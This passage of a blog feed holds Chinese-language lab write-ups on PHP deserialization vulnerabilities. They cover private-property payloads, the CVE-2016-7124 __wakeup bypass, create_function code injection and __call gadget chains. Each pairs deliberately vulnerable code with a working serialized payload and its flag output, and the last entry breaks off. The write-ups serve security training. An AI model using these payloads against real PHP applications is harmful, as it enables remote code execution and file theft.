class="comment">//O:7:&quot;Justice&quot;:2:&#123;S:13:&quot;\00Justice\00head&quot;;O:5:&quot;Libra&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;balance&quot;;&#125;S:13:&quot;\00Justice\00tail&quot;;s:9:&quot;symbolize&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;Justice&quot;:2:&#123;S:13:&quot;\00Justice\00head&quot;;O:5:&quot;Libra&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;balance&quot;;&#125;S:13:&quot;\00Justice\00tail&quot;;s:9:&quot;symbolize&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入<code>payload</code>，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Justice::__destruct</span><br><span class="line">Libra::__call</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><ol><li>反序列化时触发<code>Justice::__destruct</code> ，会执行<code>$head-&gt;$tail();</code> ，会把<code>$head</code>当作对象，<code>$tail()</code> 当作成员方法去调用</li><li>如果调用该对象中不存在的成员方法就会触发 <code>call</code> ，在<code>call</code> 中要求参数<code>$func === &#39;symbolize&#39; </code>，其中 <code>call</code> 的第一个参数就是该对象调用的不存在的成员方法，因此只需要调用<code>Libra::symbolize</code>就会触发<code>call</code>并且满足<code>$func</code></li></ol><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/cz5wll15phim2d7i">https://www.yuque.com/shiyizhesonder/sonder39/cz5wll15phim2d7i</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="__call与属性的初始值" scheme="http://example.com/tags/call%E4%B8%8E%E5%B1%9E%E6%80%A7%E7%9A%84%E5%88%9D%E5%A7%8B%E5%80%BC/"/>
    
  </entry>
  
  <entry>
    <title>serVuln6 私有属性反序列化</title>
    <link href="http://example.com/2023/12/22/serVuln6/"/>
    <id>http://example.com/2023/12/22/serVuln6/</id>
    <published>2023-12-22T13:06:23.000Z</published>
    <updated>2024-02-29T12:14:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Virgo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;comm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Virgo&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;%&quot;</span>, <span class="string">&quot;replaced&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Virgo&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$param</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Virgo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$comm</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;comm = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Virgo</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>));</span><br><span class="line"><span class="comment">//O:5:&quot;Virgo&quot;:1:&#123;s:11:&quot; Virgo comm&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:5:&quot;Virgo&quot;:1:&#123;S:11:&quot;\00Virgo\00comm&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Virgo&quot;:1:&#123;S:11:&quot;\00Virgo\00comm&quot;;s:20:&quot;system(&#x27;cat /flag&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入<code>payload</code>，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Virgo::__destruct</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/gymkfemieez7rec4">https://www.yuque.com/shiyizhesonder/sonder39/gymkfemieez7rec4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="私有属性反序列化" scheme="http://example.com/tags/%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>serVuln5 序列化格式过滤与CVE-2016-7124</title>
    <link href="http://example.com/2023/12/22/serVuln5/"/>
    <id>http://example.com/2023/12/22/serVuln5/</id>
    <published>2023-12-22T13:05:23.000Z</published>
    <updated>2024-02-29T12:14:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>CVE-2016-7124漏洞影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Leo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Leo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;服务器检测到恶意反序列化格式数据，启动了查杀程序\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>              </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Leo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize(new Leo(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="comment">//O:+3:&quot;Leo&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:+3:&quot;Leo&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A%2B3%3A%22Leo%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure><p>传入<code>payload</code>，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Leo::__destruct</span><br><span class="line">Sonder&#123;571a973-658c89b3ebb7d-47bc0603c81b&#125;</span><br></pre></td></tr></table></figure><ol><li>当序列化字符串中，对象的属性个数与实际的属性个数不相等时，反序列化不会触发<code>wakeup</code> </li><li><code>O:+3:</code>代替<code>O:3:</code> 绕过<code>[oc]:\d:</code>的正则检测，这样<code>:</code>与<code>:</code> 之间就不是纯数字了</li><li>用<code>urlencode()</code> 编码防止<code>+ </code>在<code>get</code> 请求中被浏览器当作空格解析</li></ol><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/yp9tmv9a0op0b9tp">https://www.yuque.com/shiyizhesonder/sonder39/yp9tmv9a0op0b9tp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;p&gt;CVE-2016-7124漏洞影响版本：PHP5 &amp;lt; 5.6.25，PHP7 &amp;lt; 7.0.10&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CVE-2016-7124" scheme="http://example.com/tags/CVE-2016-7124/"/>
    
  </entry>
  
  <entry>
    <title>serVuln4 create_fucntion与可变函数</title>
    <link href="http://example.com/2023/12/22/serVuln4/"/>
    <id>http://example.com/2023/12/22/serVuln4/</id>
    <published>2023-12-22T13:04:23.000Z</published>
    <updated>2024-02-29T12:14:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cancer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Cancer&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Cancer&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>                       </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cancer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&#125;system(&#x27;ls&#x27;);//&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cancer</span> = <span class="keyword">new</span> <span class="title class_">Cancer</span>();</span><br><span class="line"><span class="variable">$getflag</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="variable">$cancer</span>-&gt;key = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$getflag</span>, <span class="string">&quot;create&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cancer</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Cancer&quot;:1:&#123;s:3:&quot;key&quot;;s:114:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:16:&quot;&#125;system(&#x27;ls&#x27;);//&quot;;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:6:&quot;create&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>注意：两个类实例化调用属性的顺序。</p><p>传入<code>payload</code> ，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cancer::__destruct</span><br><span class="line">GetFlag::create</span><br><span class="line">assert</span><br><span class="line">index.php</span><br><span class="line">module</span><br></pre></td></tr></table></figure><p><code>payload</code> 被反序列化，触发<code>Cancer</code> 类的 <code>destruct</code> 方法，进而<code>key</code> 被反序列化，也就是<code>unserialize(serialize(array($getflag, &quot;create&quot;)))();</code> ，这段代码会调用 <code>GetFlag::create</code> 方法。</p><p>这是因为在 PHP 中，<code>array($getflag, &quot;create&quot;)</code> 创建了一个包含两个元素的数组，第一个元素是 <code>GetFlag</code> 类的一个实例 <code>$getflag</code>，第二个元素是字符串 “create”。在 PHP 中，这样的数组可以被解释为一个回调函数，其中 <code>$getflag</code> 是要调用方法的对象，”create” 是要调用的方法名。</p><p>而<code>array($getflag, &quot;create&quot;)()</code>与<code>call_user_func(array($getflag, &quot;create&quot;))</code>是等价的，可以看一个demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cssec</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CSSEC</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$cssec</span>, <span class="string">&quot;test&quot;</span>)); <span class="comment">// 输出CSSEC::test</span></span><br><span class="line"><span class="keyword">array</span>(<span class="variable">$getflag</span>, <span class="string">&quot;create&quot;</span>)(); <span class="comment">// 输出CSSEC::test</span></span><br><span class="line"><span class="variable">$cssec</span>-&gt;<span class="title function_ invoke__">test</span>(); <span class="comment">// 输出CSSEC::test，这三者效果是一样的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 回到题目，调用<code>GetFlag::create</code> 方法后，由于<code>GetFlag</code>类中存在<code>$a(&#39;&#39;, $this-&gt;code);</code> ，这里为了减小难度，直接提示<code>create_function(&#39;&#39;, $this-&gt;code)</code>，考虑 <code>create_function</code> 函数的特性，这里会创建一个新的匿名函数，并将其函数体作为字符串传递给 <code>eval()</code> 函数。<code>eval()</code> 函数会执行这个字符串中的 PHP 代码。</p><p>PS：这也是<code>create_function</code>被移除的原因</p><p>对于<code>&quot;&#125;system(&#39;chdir&#39;);//&quot;</code>，这段代码以 <code>&#125;</code> 开头，会导致 <code>eval()</code> 函数认为当前的函数体已经结束，然后执行后面的 <code>system(&#39;chdir&#39;);</code> 代码，其中<code>//</code>并不是注释符的作用，而是为了防止<code>&quot;&#125;system(&#39;chdir&#39;);&quot;</code> 被完整解析，导致语法错误，<code>//</code>可以用<code>#</code>、<code>&#123;</code>代替，有兴趣可以测试一下这个demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>); <span class="comment">// 输出CSSEC::test</span></span><br><span class="line">        <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&quot;&#125;system(&#x27;chdir&#x27;);//&quot;</span>); <span class="comment">// 输出当前所在路径</span></span><br><span class="line">        <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&quot;echo &#x27;test&#x27;;&#125;system(&#x27;chdir&#x27;);//&quot;</span>); <span class="comment">// 只输出当前所在路径</span></span><br><span class="line">        <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&quot;&#125;system(&#x27;chdir&#x27;);#&quot;</span>); <span class="comment">// 输出当前所在路径</span></span><br><span class="line">        <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&quot;&#125;system(&#x27;chdir&#x27;);&#123;&quot;</span>); <span class="comment">// 输出当前所在路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cssec</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CSSEC</span>();</span><br><span class="line"><span class="keyword">array</span>(<span class="variable">$cssec</span>, <span class="string">&quot;test&quot;</span>)();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="可变函数与create-function"><a href="#可变函数与create-function" class="headerlink" title="可变函数与create_function"></a>可变函数与create_function</h1><p>引用自PHP手册：</p><ol><li>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现回调函数等等</li><li><code>create_function</code> 通过执行代码字符串创建动态函数。该函数已自<code>PHP 7.2.0 </code>  起被废弃，并自<code>PHP 8.0.0 </code> 起被移除</li><li>相关知识：<ol><li>可变函数：<a href="https://www.php.net/manual/zh/functions.variable-functions.php">https://www.php.net/manual/zh/functions.variable-functions.php</a></li><li>create_function：<a href="https://www.php.net/manual/zh/function.create-function.php">https://www.php.net/manual/zh/function.create-function.php</a></li><li>回调函数：<a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="create_fucntion与可变函数" scheme="http://example.com/tags/create-fucntion%E4%B8%8E%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>serVuln3 代码审计2</title>
    <link href="http://example.com/2023/12/22/serVuln3/"/>
    <id>http://example.com/2023/12/22/serVuln3/</id>
    <published>2023-12-22T13:03:23.000Z</published>
    <updated>2024-02-29T12:14:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gemini</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;id === <span class="string">&quot;1317&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;user === <span class="string">&quot;lutalica&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;Gemini&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;Gemini&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>                        </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gemini</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Gemini</span>(<span class="string">&quot;1317&quot;</span>, <span class="string">&quot;lutalica&quot;</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 